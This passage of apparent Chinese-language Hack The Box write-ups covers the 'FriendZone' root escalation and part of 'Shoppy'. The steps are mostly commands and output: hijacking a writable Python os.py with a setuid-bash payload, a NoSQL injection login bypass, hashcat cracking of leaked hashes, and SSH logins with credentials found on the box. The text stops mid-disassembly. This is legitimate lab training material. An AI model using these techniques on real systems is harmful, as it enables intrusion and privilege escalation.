/etc/passwd|grep bash\nroot:x:0:0:root:/root:/bin/bash\nfriend:x:1000:1000:friend,,,:/home/friend:/bin/bash\n```\n可以看到当前也有这个用户，去尝试 ssh 登陆试试\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ssh friend@10.10.10.123\nThe authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.\nED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.123' (ED25519) to the list of known hosts.\nfriend@10.10.10.123's password: \nWelcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nYou have mail.\nLast login: Thu Jan 24 01:20:15 2019 from 10.10.14.3\nfriend@FriendZone:~$ whoami&&id\nfriend\nuid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)\n```\n登入成功\n\n## Root\n使用 pspy64 跑一下\n\n```bash\n2022/09/20 05:44:01 CMD: UID=0    PID=1417   | /bin/sh -c /opt/server_admin/reporter.py \n2022/09/20 05:44:01 CMD: UID=0    PID=1416   | /bin/sh -c /opt/server_admin/reporter.py\n```\n发现有一个脚本 /opt/server\\_admin/reporter.py 一直在运行\n\n```bash\nfriend@FriendZone:~$ ls -la /opt/server_admin/reporter.py\n-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py\n```\n并且还是 root 权限的\n\n```bash\nfriend@FriendZone:~$ cat /opt/server_admin/reporter.py\n#!/usr/bin/python\n\nimport os\n\nto_address = \"admin1@friendzone.com\"\nfrom_address = \"admin2@friendzone.com\"\n\nprint \"[+] Trying to send email to %s\"%to_address\n\n#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"'''\n\n#os.system(command)\n\n# I need to edit the script later\n# Sam ~ python developer\n```\n我们没有写入权限，但是它会导入一个 os 库，咱们去查看一下是否有权限\n\n```bash\nfriend@FriendZone:/usr/lib/python2.7$ ls -la|grep os.py\n-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py\n```\n咱们是有写入权限的，那就写入一段恶意程序就好了\n\n```bash\necho \"system('chmod +s /bin/bash')\" >> os.py\n```\n```bash\nfriend@FriendZone:/usr/lib/python2.7$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash\n```\n等待两分钟，看到加上 s 权限后，就可以提权了\n\n```bash\nfriend@FriendZone:/usr/lib/python2.7$ /bin/bash -p\nbash-4.4# whoami&&id\nroot\nuid=1000(friend) gid=1000(friend) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(friend)\n```\n成功提权到 root 权限\n\n```bash\nbash-4.4# cat /root/root.txt\nd93cbc3ed65646042735f3ee312fe2c5\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Shoppy - Hackthebox","url":"/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/","content":"\n# Hackthebox - Shoppy\n# 靶场信息\n![image](Hackthebox-Shoppy/sMP6VyYQsVBPHnpOtxvXg5zHVcvJK_iZMEZiD6H4LF8.png)\n\n# 靶场类型\n![image](Hackthebox-Shoppy/_njbcZuolm5NBBnlKHDNrUwsD_OIuUJuvBRpvmLm4A4.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.180\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 20:59 EST\nNmap scan report for 10.10.11.180\nHost is up (0.25s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)\n|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)\n|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)\n80/tcp   open  http     nginx 1.23.1\n|_http-title: Did not follow redirect to http://shoppy.htb\n|_http-server-header: nginx/1.23.1\n9093/tcp open  copycat?\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/plain; version=0.0.4; charset=utf-8\n|     Date: Thu, 22 Dec 2022 01:59:42 GMT\n|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.\n|     TYPE go_gc_cycles_automatic_gc_cycles_total counter\n|     go_gc_cycles_automatic_gc_cycles_total 2612\n|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.\n|     TYPE go_gc_cycles_forced_gc_cycles_total counter\n|     go_gc_cycles_forced_gc_cycles_total 0\n|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.\n|     TYPE go_gc_cycles_total_gc_cycles_total counter\n|     go_gc_cycles_total_gc_cycles_total 2612\n|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n|     TYPE go_gc_duration_seconds summary\n|     go_gc_duration_seconds{quantile=\"0\"} 4.218e-05\n|     go_gc_duration_seconds{quantile=\"0.25\"} 0.000107572\n|   HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/plain; version=0.0.4; charset=utf-8\n|     Date: Thu, 22 Dec 2022 01:59:43 GMT\n|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.\n|     TYPE go_gc_cycles_automatic_gc_cycles_total counter\n|     go_gc_cycles_automatic_gc_cycles_total 2612\n|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.\n|     TYPE go_gc_cycles_forced_gc_cycles_total counter\n|     go_gc_cycles_forced_gc_cycles_total 0\n|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.\n|     TYPE go_gc_cycles_total_gc_cycles_total counter\n|     go_gc_cycles_total_gc_cycles_total 2612\n|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n|     TYPE go_gc_duration_seconds summary\n|     go_gc_duration_seconds{quantile=\"0\"} 4.218e-05\n|_    go_gc_duration_seconds{quantile=\"0.25\"} 0.000107572\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9093-TCP:V=7.93%I=7%D=12/21%Time=63A3BA0E%P=x86_64-pc-linux-gnu%r(G\nSF:enericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20\nSF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\\nSF:x20Request\")%r(GetRequest,2F0E,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\nSF:\\x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Thu,\\x\nSF:2022\\x20Dec\\x202022\\x2001:59:42\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles\nSF:_automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\\nSF:x20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles\nSF:_automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles\nSF:_total\\x202612\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Cou\nSF:nt\\x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applica\nSF:tion\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo\nSF:_gc_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total\nSF:_gc_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n\nSF:#\\x20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycle\nSF:s_total_gc_cycles_total\\x202612\\n#\\x20HELP\\x20go_gc_duration_seconds\\x2\nSF:0A\\x20summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20col\nSF:lection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo\nSF:_gc_duration_seconds{quantile=\\\"0\\\"}\\x204\\.218e-05\\ngo_gc_duration_seco\nSF:nds{quantile=\\\"0\\.25\\\"}\\x200\\.000107572\\ngo_\")%r(HTTPOptions,2A5A,\"HTTP\nSF:/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\\nSF:x20charset=utf-8\\r\\nDate:\\x20Thu,\\x2022\\x20Dec\\x202022\\x2001:59:43\\x20G\nSF:MT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\\nSF:x20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20r\nSF:untime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counte\nSF:r\\ngo_gc_cycles_automatic_gc_cycles_total\\x202612\\n#\\x20HELP\\x20go_gc_c\nSF:ycles_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycle\nSF:s\\x20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_fo\nSF:rced_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x2\nSF:00\\n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20a\nSF:ll\\x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_c\nSF:ycles_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x202612\\n#\\x\nSF:20HELP\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\\nSF:x20duration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go\nSF:_gc_duration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\\"0\\\"}\nSF:\\x204\\.218e-05\\ngo_gc_duration_seconds{quantile=\\\"0\\.25\\\"}\\x200\\.000107\nSF:572\\ngo_\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=41733%PV=Y%DS=2%DC=T%G=Y%TM=63A3BA\nOS:84%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST\nOS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   276.37 ms 10.10.14.1\n2   276.85 ms 10.10.11.180\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 150.68 seconds\n```\n这里一看就需要做 hosts 解析，我们加进去\n\n```bash\necho 10.10.11.180 shoppy.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Shoppy/WfyNY3no_puTV2jPd_All7D9oO3vFQTLcuiSjxjvrPw.png)\n\n似乎是一个什么倒计时，倒计时到了就会推出一个什么版本，咱们做个信息收集先\n\n## Fuzz\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u \"http://shoppy.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://shoppy.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ncss                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 291ms]\nadmin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 314ms]\nimages                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 315ms]\njs                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 322ms]\nlogin                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 339ms]\nassets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 278ms]\nAdmin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 295ms]\nLogin                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 295ms]\nfonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 277ms]\nADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 277ms]\nexports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 279ms]\n                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 279ms]\nLOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 288ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 23 req/sec :: Duration: [0:03:43] :: Errors: 2 ::\n```\n经过测试，只有 Login 可以访问，是一个登陆页面\n\n![image](Hackthebox-Shoppy/WBwPDhoGXNQa1XI4aB8PUKBWqkZX0pQ3eKMMX4b-kgk.png)\n\n这里可以使用万能密码 admin'||''===' 进行登陆\n\n![image](Hackthebox-Shoppy/GcmtkFUlivIGLn3p3Hz6FnE-3XS_gxDcsZYK3YWu-Ps.png)\n\n登入后是一个价格表，右上角有个查询用户的功能\n\n我们查询万能密码后，会得到两个账户\n\n```bash\n{\"_id\":\"62db0e93d6d6a999a66ee67a\",\"username\":\"admin\",\"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"}\n{\"_id\":\"62db0e93d6d6a999a66ee67b\",\"username\":\"josh\",\"password\":\"6ebcea65320589ca4f2f1ce039975995\"}\n```\n# 漏洞利用\n把 password 提取出来，丢 hashcat 跑一下\n\n```bash\necho \"6ebcea65320589ca4f2f1ce039975995\" > hash\n\n┌──(root㉿kali)-[~/Desktop]\n└─# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt       \nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: pthread-12th Gen Intel(R) Core(TM) i5-12400F, 1438/2940 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nINFO: All hashes found as potfile and/or empty entries! Use --show to display them.\n\nStarted: Wed Dec 21 22:07:00 2022\nStopped: Wed Dec 21 22:07:00 2022\n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show\n6ebcea65320589ca4f2f1ce039975995:remembermethisway\n```\n这边只有 josh 的账户爆出来了，admin 的无法爆出来\n\n使用这个密码进行 ssh 登陆，是失败的，那就证明还有我们没有发现的地方，这里我们尝试爆破子域名\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -H \"Host: FUZZ.shoppy.htb\" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.180 -fs 169\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.180\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n :: Header           : Host: FUZZ.shoppy.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 169\n________________________________________________\n\nmattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 266ms]\n:: Progress: [100000/100000] :: Job [1/1] :: 150 req/sec :: Duration: [0:11:17] :: Errors: 0 ::\n```\n加入到 hosts 解析中\n\n```bash\necho 10.10.11.180 mattermost.shoppy.htb >> /etc/hosts\n```\n接着去访问一下\n\n![image](Hackthebox-Shoppy/aKaBFxvX_vfRmsqL9qxyRQSJzdsda4EwH-KzAaqr8P4.png)\n\n是一个登陆界面，用我们刚才破解出来的账号密码去进行登陆\n\n```bash\nusername = josh\npassword = remembermethisway\n```\n![image](Hackthebox-Shoppy/MH3Lu48sq_naDTgKDLRD6PHVIVHo4XVsyMIKkrRhLRs.png)\n\n登陆成功，到处看一下，做一下信息收集\n\n![image](Hackthebox-Shoppy/n0ZwZ9z_PivUPrbXRkrT2vLaxAwJ871NRnTBc5ns06Y.png)\n\n在 Deploy Machine 中，我们看到 jaeger 发布了一个账号密码\n\n```bash\nusername = jaeger\npassword = Sh0ppyBest@pp!\n```\n这似乎是一个用 docker 部署的东西，那应该可以使用 ssh 进行登陆\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh jaeger@10.10.11.180 \njaeger@10.10.11.180's password: \nLinux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\njaeger@shoppy:~$ whoami&&id\njaeger\nuid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)\n```\n登陆成功\n\n```bash\njaeger@shoppy:~$ cat user.txt \nff6024ae7ef749b44ac3fbc6ce9df1ce\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n## User\n```bash\njaeger@shoppy:~$ sudo -l\n[sudo] password for jaeger: \nMatching Defaults entries for jaeger on shoppy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser jaeger may run the following commands on shoppy:\n    (deploy) /home/deploy/password-manager\n```\n这里发现一个奇怪的文件，我们想办法给他搞出来在本地分析一下\n\n```bash\ncd /home/deploy/\npython3 -m http.server 1234\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# wget http://10.10.11.180:1234/password-manager                                  \n--2022-12-22 01:34:58--  http://10.10.11.180:1234/password-manager\n正在连接 10.10.11.180:1234... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：18440 (18K) [application/octet-stream]\n正在保存至: “password-manager”\n\npassword-manager                                     100%[=====================================================================================================================>]  18.01K  63.9KB/s  用时 0.3s    \n\n2022-12-22 01:34:59 (63.9 KB/s) - 已保存 “password-manager” [18440/18440])\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# file password-manager                                                                                    \npassword-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped\n```\n这是一个 64 位的可执行文件\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# r2 password-manager \nWarning: run r2 with -e bin.cache=true to fix relocations in disassembly\n[0x00001120]>\n```\n使用 r2 分析一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# r2 password-manager \nWarning: run r2 with -e bin.cache=true to fix relocations in disassembly\n[0x00001120]> aaa\n[x] Analyze all flags starting with sym. and entry0 (aa)\n[x] Analyze function calls (aac)\n[x] Analyze len bytes of instructions for references (aar)\n[x] Finding and parsing C++ vtables (avrr)\n[x] Type matching analysis for all functions (aaft)\n[x] Propagate noreturn information (aanr)\n[x] Use -AA or aaaa to perform additional experimental analysis.\n[0x00001120]> afl\n0x00001120    1 43           entry0\n0x00001150    4 41   -> 34   sym.deregister_tm_clones\n0x00001180    4 57   -> 51   sym.register_tm_clones\n0x000011c0    5 57   -> 50   sym.__do_global_dtors_aux\n0x00001110    1 6            sym.imp.__cxa_finalize\n0x00001200    1 5            entry.init0\n0x000013eb    4 73           sym.__static_initialization_and_destruction_0_int__int_\n0x000010e0    1 6            sym.imp.std::ios_base::Init::Init__\n0x00001060    1 6            sym.imp.__cxa_atexit\n0x00001434    1 21           sym._GLOBAL__sub_I_main\n0x00001000    3 23           sym._init\n0x00001205    5 486  -> 426  main\n0x000014b4    1 9            sym._fini\n0x00001450    4 93           sym.__libc_csu_init\n0x000014b0    1 1            sym.__libc_csu_fini\n0x00001030    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const\n0x00001040    1 6            fcn.00001040\n0x00001050    1 6            sym.imp.system\n0x00001070    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_\n0x00001080    1 6            sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_\n0x00001090    1 6            sym.imp.std::ostream::operator___std::ostream____std::ostream__\n0x000010a0    1 6            fcn.000010a0\n0x000010b0    1 6            sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____\n0x000010c0    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_\n0x000010d0    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__\n0x000010f0    1 6            sym.imp._Unwind_Resume\n0x00001100    1 6            sym.imp.std::allocator_char_::allocator__\n```\n使用函数 `aaa` 自动分析并命名函数，使用函数 `afl` 查看程序内的函数\n\n这里找到了 main 函数，然后去到 main 函数的地址并查看汇编代码\n\n```bash\n[0x00001120]> s main\n[0x00001205]> pdf\n            ; DATA XREF from entry0 @ 0x113d\n┌ 426: int main (int argc, char **argv, char **envp);\n│           ; var int64_t var_60h @ rbp-0x60\n│           ; var int64_t var_40h @ rbp-0x40\n│           ; var int64_t var_11h @ rbp-0x11\n│           ; var int64_t var_8h @ rbp-0x8\n│           0x00001205      55             push rbp\n│           0x00001206      4889e5         mov rbp, rsp\n│           0x00001209      53             push rbx\n│           0x0000120a      4883ec58       sub rsp, 0x58\n│           0x0000120e      488d35fb0d00.  lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; \"Welcome to Josh password manager!\"\n│           0x00001215      488d3da42e00.  lea rdi, obj.std::cout      ; sym..bss\n│                                                                      ; 0x40c0                                                                                                                                    \n│           0x0000121c      e85ffeffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \n│           0x00001221      4889c2         mov rdx, rax\n│           0x00001224      488b05a52d00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        \n│           0x0000122b      4889c6         mov rsi, rax\n│           0x0000122e      4889d7         mov rdi, rdx\n│           0x00001231      e85afeffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__\n│           0x00001236      488d35fb0d00.  lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; \"Please enter your master password: \"\n│           0x0000123d      488d3d7c2e00.  lea rdi, obj.std::cout      ; sym..bss\n│                                                                      ; 0x40c0                                                                                                                                    \n│           0x00001244      e837feffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \n│           0x00001249      488d45c0       lea rax, [var_40h]\n│           0x0000124d      4889c7         mov rdi, rax\n│           0x00001250      e87bfeffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string() ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__                                                                                                                                                                         \n│           0x00001255      488d45c0       lea rax, [var_40h]\n│           0x00001259      4889c6         mov rsi, rax\n│           0x0000125c      488d3d7d2f00.  lea rdi, obj.std::cin       ; 0x41e0\n│           0x00001263      e848feffff     call sym std::basic_istream<char, std::char_traits<char> >& std::operator>><char, std::char_traits<char>, std::allocator<char> >(std::basic_istream<char, std::char_traits<char> >&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&) ; sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____                                                                   \n│           0x00001268      488d45ef       lea rax, [var_11h]\n│           0x0000126c      4889c7         mov rdi, rax\n│           0x0000126f      e88cfeffff     call sym std::allocator<char>::allocator() ; sym.imp.std::allocator_char_::allocator__\n│           0x00001274      488d55ef       lea rdx, [var_11h]\n│           0x00001278      488d45a0       lea rax, [var_60h]\n│           0x0000127c      488d35d90d00.  lea rsi, [0x0000205c]\n│           0x00001283      4889c7         mov rdi, rax\n│           0x00001286      e835feffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_                                                                                           \n│           0x0000128b      488d45ef       lea rax, [var_11h]\n│           0x0000128f      4889c7         mov rdi, rax\n│           0x00001292      e809feffff     call fcn.000010a0\n│           0x00001297      488d45a0       lea rax, [var_60h]\n│           0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u\"Sample\"\n│           0x000012a2      4889c7         mov rdi, rax\n│           0x000012a5      e8c6fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012aa      488d45a0       lea rax, [var_60h]\n│           0x000012ae      488d35aa0d00.  lea rsi, [0x0000205f]       ; u\"ample\"\n│           0x000012b5      4889c7         mov rdi, rax\n│           0x000012b8      e8b3fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012bd      488d45a0       lea rax, [var_60h]\n│           0x000012c1      488d35990d00.  lea rsi, [0x00002061]       ; u\"mple\"\n│           0x000012c8      4889c7         mov rdi, rax\n│           0x000012cb      e8a0fdffff     call sym std::__cxx11::basic_string<char, 